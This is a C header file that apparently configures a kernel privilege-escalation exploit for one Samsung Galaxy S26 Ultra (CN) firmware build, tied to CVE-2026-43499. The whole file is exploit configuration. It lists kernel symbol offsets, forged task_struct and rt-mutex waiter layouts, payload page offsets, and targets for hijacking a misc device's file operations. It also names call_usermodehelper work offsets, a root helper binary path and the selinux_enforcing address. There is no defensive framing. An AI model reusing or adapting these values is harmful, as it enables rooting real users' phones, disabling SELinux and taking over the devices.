#ifndef TARGET_H
#define TARGET_H

/*
 * S9480ZCS1AZC7 (SM-S9480 / m3q / Galaxy S26 Ultra CN, Snapdragon 8 Elite)
 *
 * Single-target profile. Kernel line: "cn". task_struct layout: "S9480ZCS1AZC7".
 * See PORTING-S9480ZCS1AZC7.md for the full analysis.
 *
 * Kernel: 6.12.30-android16-5-p875b76c-abogkiS9480ZCS1AZC7-4k
 * _text = 0xffffffc080000000
 */

#define BUILD_VARIANT_LABEL "S9480ZCS1AZC7"
#define BUILD_EXYNOS 0

/* ---- Kernel image layout (Samsung 6.12 GKI) ---- */
#define KIMAGE_TEXT_BASE 0xffffffc080000000ULL
#define KERNELSNITCH_IDENTITY_START 0xffffff8000000000ULL
#define KERNELSNITCH_IDENTITY_END 0xffffff9000000000ULL
#define DIRECT_MAP_BASE 0xffffff8000000000ULL
#define DIRECT_MAP_END 0xffffff9000000000ULL
#define VMEMMAP_START 0xfffffffe00000000ULL

/* ---- Attr carrier page layout ---- */
/* Red line: list.prev must stay 0; regions must not overlap. */
#define ATTR_CONTROLLER_OFF 0x5700
#define ATTR_DATA_OFF 0x5800
#define ATTR_FOPS_OFF 0x5900
#define ATTR_W1_SCRATCH_OFF 0x5a00
#define ATTR_OBJECT_SIZE 0x80
#define MISC_STRUCT_MINOR_OFF 0x00
#define MISC_STRUCT_NAME_OFF 0x08
#define MISC_STRUCT_FOPS_OFF 0x10
#define MISC_STRUCT_LIST_OFF 0x18
#define MISC_STRUCT_NODENAME_OFF 0x40
#define MISC_STRUCT_MODE_OFF 0x48
#define ATTR_GET_OFF MISC_STRUCT_MINOR_OFF
#define ATTR_DATA_PTR_OFF MISC_STRUCT_NODENAME_OFF
#define UINPUT_DEVICE "/dev/uinput"
#define UINPUT_MINOR 223U

#define ROOT_UMH_PATH "/data/local/tmp/cve-2026-43499-root"
#define WORK_DATA_OFF 0x00
#define WORK_ENTRY_OFF 0x08
#define WORK_FUNC_OFF 0x18

/* ---- Payload page layout (order-3 page). Dense seed: do not change. ---- */
#define LOCK_OFF 0x2210
#define W0_OFF 0x2350
#define FOPS_OFF 0x2000
#define RIGHT_OFF 0x4440
#define LEFT_OFF 0x5550
#define FAKE_TASK_OFF 0x3200
#define ROOT_UMH_WORK_OFF 0x6000
#define ROOT_UMH_DATA_OFF 0x6200
#define FAKE_WAITER_TREE_PRIO_OFF 0x18
#define FAKE_WAITER_TREE_DEADLINE_OFF 0x20
#define FAKE_WAITER_PI_TREE_ENTRY_OFF 0x28
#define FAKE_WAITER_PI_TREE_PRIO_OFF 0x40
#define FAKE_WAITER_PI_TREE_DEADLINE_OFF 0x48
#define FAKE_WAITER_TASK_OFF 0x50
#define FAKE_WAITER_LOCK_OFF 0x58
#define FAKE_WAITER_WAKE_STATE_OFF 0x60
#define FAKE_WAITER_WW_CTX_OFF 0x68

/*
 * task_struct layout — "S9480ZCS1AZC7".
 *
 * S9480ZCS1AZC7 backports sched_ext / dl_server, which shift task_struct
 * fields relative to the default layout even though every kallsyms address
 * stays identical. These are compile-time constants (prepare_skb_payload
 * codegen is timing-sensitive), so a binary built for one layout must only
 * run against the matching profile — see params_resolve().
 */
#define FAKE_TASK_USAGE_OFF 0x40
#define FAKE_TASK_PRIO_OFF 0x94
#define FAKE_TASK_NORMAL_PRIO_OFF 0x9c
#define FAKE_TASK_TASK_GROUP_OFF 0x420
/* pi_lock is dead data (never read by the kernel), but removing the field
 * changes prepare_skb_payload codegen (timing-sensitive: must stay IDENTICAL).
 */
#define FAKE_TASK_PI_LOCK_OFF 0x9ec
#define FAKE_TASK_PI_WAITERS_OFF 0xa00
#define FAKE_TASK_PI_TOP_TASK_OFF 0xa10
#define FAKE_TASK_PI_BLOCKED_ON_OFF 0xa18

/* ---- workqueue / pool_workqueue / worker_pool ---- */
#define WQ_DFL_PWQ_OFF 0xc0
#define WQ_MAX_ACTIVE_OFF 0xa4
#define WQ_FLAGS_OFF 0x100
#define WQ_NODE_NR_ACTIVE_OFF 0x110
#define WQ_UNBOUND_FLAG (1U << 1)
#define WQ_NNA_MAX_OFF 0x00
#define WQ_NNA_NR_OFF 0x04
#define PWQ_POOL_OFF 0x00
#define PWQ_WQ_OFF 0x08
#define PWQ_WORK_COLOR_OFF 0x10
#define PWQ_REFCNT_OFF 0x18
#define PWQ_NR_IN_FLIGHT_OFF 0x1c
#define PWQ_PLUGGED_OFF 0x5c
#define PWQ_NR_ACTIVE_OFF 0x60
#define PWQ_INACTIVE_WORKS_OFF 0x68
#define PWQ_PENDING_NODE_OFF 0x78
#define POOL_NODE_OFF 0x08
#define POOL_WORKLIST_OFF 0x28
#define POOL_NR_IDLE_OFF 0x3c

#define STRUCT_PAGE_SIZE 0x40
#define FOPS_OWNER_OFF 0x00
#define FOPS_LLSEEK_OFF 0x10
#define FOPS_READ_OFF 0x18
#define FOPS_WRITE_OFF 0x20
#define FOPS_READ_ITER_OFF 0x28
#define FOPS_WRITE_ITER_OFF 0x30
#define FOPS_IOCTL_OFF 0x50
#define FOPS_COMPAT_IOCTL_OFF 0x58
#define FOPS_MMAP_OFF 0x60
#define FOPS_OPEN_OFF 0x68
#define FOPS_RELEASE_OFF 0x78
#define FOPS_SPLICE_READ_OFF 0xb8
#define FOPS_SHOW_FDINFO_OFF 0xd8

/* ---- Per-line symbol offsets ("cn", verified vs S9480ZCS1AZC7) ---- */
#define TRACEFS_EVENT_ID 110
#define TRACEFS_WORKER_CALLER_OFF 0x103878ULL
#define ROOT_TASK_GROUP_OFF 0x02763580ULL
#define INIT_TASK_OFF 0x0252D040ULL
#define MISC_LIST_OFF 0x0264CFE0ULL
#define UINPUT_MISC_OFF 0x02671800ULL
#define SIMPLE_ATTR_READ_OFF 0x00484D3CULL
#define SIMPLE_ATTR_WRITE_OFF 0x00484E8CULL
#define DEBUGFS_U64_GET_OFF 0x00675384ULL
#define DEBUGFS_U64_SET_OFF 0x00675398ULL
#define DEFAULT_LLSEEK_OFF 0x0043FB54ULL
#define DEBUGFS_U64_FORMAT_OFF 0x0148C338ULL
#define CALL_USERMODEHELPER_EXEC_WORK_OFF 0x000F8F0CULL
#define SYSTEM_UNBOUND_WQ_OFF 0x01915250ULL
#define SELINUX_ENFORCING_OFF 0x027AFB08ULL
#define PHYS_OFFSET 0x80000000ULL
#define PHYS_LOAD 0xc7800000ULL

/* kimage_voffset (cn/intl line; exynos differs). Used by root.c to derive the
 * physical slide once arbitrary read is available. */
#define KIMAGE_VOFFSET_OFF 0x01911008ULL

#endif /* TARGET_H */
